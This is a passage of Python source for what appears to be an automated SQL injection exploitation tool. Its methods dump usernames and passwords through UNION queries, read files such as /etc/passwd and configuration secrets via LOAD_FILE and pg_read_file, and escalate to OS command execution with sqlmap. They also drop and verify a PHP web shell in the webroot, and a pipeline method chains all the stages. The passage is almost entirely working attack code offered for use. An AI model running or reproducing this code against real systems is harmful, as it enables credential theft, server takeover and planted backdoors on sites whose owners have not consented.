                    f"' UNION SELECT GROUP_CONCAT({user_col},'§',{pass_col} ORDER BY 1 SEPARATOR '|'),NULL "
                    f"FROM {table} LIMIT 50-- -"
                )
            else:
                query = f"' UNION SELECT {user_col}||'§'||{pass_col},NULL FROM {table} LIMIT 50-- -"

            try:
                r = self.session.get(self._inject_fn(url, param, query), timeout=10)
                rows = re.findall(r'([^|§\n]{1,100})§([^|§\n]{1,100})', r.text)
                for uname, pwd in rows[:50]:
                    results.append({
                        "table": table,
                        "username": uname.strip(),
                        "password": pwd.strip(),
                        "url": url,
                    })
            except Exception:
                continue

        return results

    def attempt_os_shell(
        self,
        url: str,
        param: str,
        extra_sqlmap_args: Optional[List[str]] = None,
        timeout: int = 180,
    ) -> Dict[str, Any]:
        """
        Escalate SQLi to OS command execution via SQLMap --os-cmd.

        Runs: sqlmap -u URL -p PARAM --os-cmd id --batch --level=3 --risk=2
        Captures first command output (id/whoami).

        Returns:
            {"success": bool, "technique": str, "command_output": str}
        """
        import subprocess
        import shutil
        import tempfile

        sqlmap_bin = shutil.which("sqlmap")
        if not sqlmap_bin:
            return {"success": False, "error": "sqlmap not in PATH"}

        out_dir = tempfile.mkdtemp(prefix="ws_sqlmap_osshell_")

        cmd = [
            sqlmap_bin, "-u", url, "-p", param,
            "--os-cmd", "id",
            "--batch",
            "--level=3",
            "--risk=2",
            "--technique=BEUSTQ",
            f"--output-dir={out_dir}",
            "--disable-coloring",
        ]
        if extra_sqlmap_args:
            cmd.extend(extra_sqlmap_args)

        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, encoding="utf-8",
                errors="replace", timeout=timeout, check=False,
            )
            output = proc.stdout + "\n" + proc.stderr
            m = re.search(
                r"command standard output:\s*'([^']+)'|uid=\d+\([^)]+\)",
                output, re.I,
            )
            if m:
                return {
                    "success": True,
                    "technique": "sqlmap_os_cmd",
                    "command": "id",
                    "command_output": m.group(0)[:500],
                    "sqlmap_output": output[:3000],
                }
            return {
                "success": False,
                "error": "No command output found",
                "sqlmap_output": output[:2000],
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": f"SQLMap timed out after {timeout}s"}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            import shutil as _sh
            try:
                _sh.rmtree(out_dir)
            except Exception as _fix_e:
                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")

    def attempt_file_read(
        self, url: str, param: str, db_hint: str = "mysql"
    ) -> Dict[str, str]:
        """
        Read sensitive server files via SQLi LOAD_FILE() (MySQL) or pg_read_file (PostgreSQL).

        Returns:
            {file_path: file_content_excerpt, ...}
        """
        results: Dict[str, str] = {}

        for fpath in self._FILE_TARGETS[:8]:
            if db_hint in ("mysql", "mariadb"):
                query = f"' UNION SELECT LOAD_FILE('{fpath}'),NULL-- -"
            elif db_hint == "postgresql":
                query = f"' UNION SELECT pg_read_file('{fpath}',0,10000),NULL-- -"
            else:
                continue

            try:
                r = self.session.get(self._inject_fn(url, param, query), timeout=10)
                content_indicators = (
                    "root:x:", "[extensions]", "DB_PASSWORD",
                    "SECRET_KEY", "define('DB_",
                )
                if any(ind in r.text for ind in content_indicators):
                    # Locate the first indicator and extract surrounding context
                    positions = [r.text.find(ind) for ind in content_indicators if ind in r.text]
                    pos = min(p for p in positions if p >= 0)
                    excerpt = r.text[max(0, pos - 50): min(len(r.text), pos + 1000)]
                    results[fpath] = excerpt.strip()
            except Exception:
                continue

        return results

    def attempt_file_write(
        self,
        url: str,
        param: str,
        webroot: str = "/var/www/html",
        db_hint: str = "mysql",
    ) -> Optional[str]:
        """
        Write a web shell via MySQL INTO OUTFILE (requires FILE privilege).

        Returns the shell URL if the shell is successfully deployed and responds,
        otherwise None.
        """
        import hashlib
        import time as _time

        shell_name = f"ws_{hashlib.md5(str(_time.time()).encode()).hexdigest()[:8]}.php"
        shell_path = f"{webroot.rstrip('/')}/{shell_name}"
        shell_content = (
            "<?php if(isset($_GET['c'])){"
            "echo '<pre>'.shell_exec($_GET['c']).'</pre>';} ?>"
        )
        shell_content_escaped = shell_content.replace("'", "\\'")

        if db_hint not in ("mysql", "mariadb"):
            return None

        query = (
            f"' UNION SELECT '{shell_content_escaped}',NULL "
            f"INTO OUTFILE '{shell_path}'-- -"
        )

        try:
            self.session.get(self._inject_fn(url, param, query), timeout=10)
            # Verify shell is reachable
            parsed = urlparse(url)
            shell_url = f"{parsed.scheme}://{parsed.netloc}/{shell_name}"
            r = self.session.get(f"{shell_url}?c=id", timeout=10)
            if "uid=" in r.text or r.status_code == 200:
                return shell_url
        except Exception as _fix_e:
            logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")

        return None

    def full_exploitation_pipeline(
        self,
        url: str,
        param: str,
        db_hint: str = "mysql",
        webroot: str = "/var/www/html",
    ) -> Dict[str, Any]:
        """
        Run all exploitation stages in order, escalating on each success.

        Stages:
        1. Schema dump
        2. Credential extraction
        3. Sensitive file reads
        4. OS shell escalation via SQLMap
        5. Web shell drop (only when file access or OS shell succeeded)

        Returns a comprehensive exploitation report dict.
        """
        report: Dict[str, Any] = {
            "url": url,
            "param": param,
            "db_hint": db_hint,
            "schema": {},
            "credentials": [],
            "file_reads": {},
            "os_shell": {},
            "web_shell": None,
        }

        # Stage 1: Schema dump
        try:
            report["schema"] = self.dump_schema(url, param, db_hint)
        except Exception as e:
            logger.debug(f"[SQLiExploiter] schema dump failed: {e!r}")

        # Stage 2: Credential extraction
        try:
            report["credentials"] = self.dump_credentials(url, param, db_hint)
        except Exception as e:
            logger.debug(f"[SQLiExploiter] credential dump failed: {e!r}")

        # Stage 3: File read
        try:
            report["file_reads"] = self.attempt_file_read(url, param, db_hint)
        except Exception as e:
            logger.debug(f"[SQLiExploiter] file read failed: {e!r}")

        # Stage 4: OS shell escalation
        try:
            report["os_shell"] = self.attempt_os_shell(url, param)
        except Exception as e:
            logger.debug(f"[SQLiExploiter] os shell failed: {e!r}")

        # Stage 5: Web shell drop (gated on prior file/OS access evidence)
        if report["os_shell"].get("success") or report["file_reads"]:
            try:
                report["web_shell"] = self.attempt_file_write(url, param, webroot, db_hint)
            except Exception as e:
                logger.debug(f"[SQLiExploiter] web shell failed: {e!r}")

        return report
